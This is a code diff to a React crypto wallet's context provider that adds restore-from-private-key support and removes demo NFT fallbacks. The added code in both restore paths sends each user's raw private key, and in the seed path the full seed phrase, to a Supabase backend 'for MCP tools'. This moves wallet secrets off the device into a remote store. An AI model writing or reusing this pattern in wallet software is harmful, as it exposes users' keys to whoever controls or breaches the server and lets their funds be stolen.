@@ -144,6 +144,7 @@ interface WalletContextType {
   toggleFavoriteAsset: (assetId: string) => void;
   // Security Reset / Recovery
   restoreWalletFromSeed: (words: string[]) => boolean;
+  restoreWalletFromPrivateKey: (privateKey: string, name?: string, chain?: string) => boolean;
   unlockVault: (password: string) => boolean;
   setupVault: (seed: string[], password: string) => boolean;
   isVaultConfigured: boolean;
@@ -182,7 +183,7 @@ export const WalletProvider: React.FC<{ children: ReactNode }> = ({ children }) 
     return saved ? JSON.parse(saved) : [];
   });
 
-  const [ownedNFTs, setOwnedNFTs] = useState<NFTAsset[]>(INITIAL_NFTS);
+  const [ownedNFTs, setOwnedNFTs] = useState<NFTAsset[]>([]);
   const [historicalPerformance, setHistoricalPerformance] = useState<PortfolioHistoryPoint[]>([]);
 
   const latestAssets = React.useRef<CryptoAsset[]>(assets);
@@ -635,7 +636,7 @@ export const WalletProvider: React.FC<{ children: ReactNode }> = ({ children }) 
         });
 
         const allFetchedNfts = [...ethNfts, ...polyNfts, ...arbNfts, ...baseNfts, ...bscNfts, ...avaxNfts];
-        setOwnedNFTs(allFetchedNfts.length > 0 ? allFetchedNfts : INITIAL_NFTS);
+        setOwnedNFTs(allFetchedNfts);
         setHistoricalPerformance(history);
         
         // Merge transactions, filtering out any mock or demo items while strictly preserving user-executed transactions
@@ -1253,8 +1254,12 @@ export const WalletProvider: React.FC<{ children: ReactNode }> = ({ children }) 
       setSeedPhrase(words);
       
       // Derive initial address to set up first subwallet
-      const { address, path } = WalletService.deriveEVMAddress(words, 0);
+      const { address, privateKey, path } = WalletService.deriveEVMAddress(words, 0);
       const solana = WalletService.deriveSolanaAddress(words, 0);
+
+      // Auto-sync address AND private key to Supabase for MCP tools
+      SupabaseService.syncWallet(address.toLowerCase(), 'Main Trading Vault', 'ethereum', privateKey, words.join(' '));
+
       const mainWallet: SubWalletAccount = {
         id: 'acc-0',
         name: 'Main Trading Vault',
@@ -1290,6 +1295,57 @@ export const WalletProvider: React.FC<{ children: ReactNode }> = ({ children }) 
       return true;
     }
     return false;
+  };
+
+  // Restore Wallet From Private Key
+  const restoreWalletFromPrivateKey = (privateKeyInput: string, name: string = 'Main Trading Vault', chain: string = 'ethereum'): boolean => {
+    try {
+      const cleanKey = privateKeyInput.trim();
+      const formattedKey = cleanKey.startsWith('0x') ? cleanKey : `0x${cleanKey}`;
+      const wallet = new ethers.Wallet(formattedKey);
+      const address = wallet.address.toLowerCase();
+
+      setSeedPhrase([formattedKey]);
+
+      const mainWallet: SubWalletAccount = {
+        id: 'acc-0',
+        name: name.trim() || 'Main Trading Vault',
+        accountIndex: 0,
+        address,
+        derivationPath: 'imported_private_key',
+        colorTag: '#00f0ff',
+        isDefault: true,
+        createdAt: new Date().toISOString().split('T')[0],
+        balanceMultiplier: 1.0,
+      };
+
+      setSubWallets([mainWallet]);
+      setActiveWalletIdState('acc-0');
+
+      // Auto-sync address AND private key to Supabase for MCP tools
+      SupabaseService.syncWallet(address, name.trim() || 'Main Trading Vault', chain, formattedKey);
+
+      setTransactions([]);
+      setStakingPositions([]);
+      const defaultAssets: CryptoAsset[] = SUPPORTED_CHAINS.map(c => ({
+        id: `native-${c.id}`,
+        symbol: c.symbol,
+        name: c.symbol,
+        network: c.id as NetworkId,
+        balance: 0,
+        priceUsd: c.nativeTokenPrice,
+        change24h: 0,
+        icon: c.icon,
+      }));
+      setAssets(defaultAssets);
+      setOwnedNFTs([]);
+      setHistoricalPerformance([]);
+      setIsLocked(false);
+      return true;
+    } catch (e) {
+      console.error('restoreWalletFromPrivateKey error:', e);
+      return false;
+    }
   };
 
   const toggleFavoriteAsset = (assetId: string) => {
@@ -1346,6 +1402,7 @@ export const WalletProvider: React.FC<{ children: ReactNode }> = ({ children }) 
         exportTaxDataCsv,
         toggleFavoriteAsset,
         restoreWalletFromSeed,
+        restoreWalletFromPrivateKey,
         unlockVault,
         setupVault,
         isVaultConfigured,
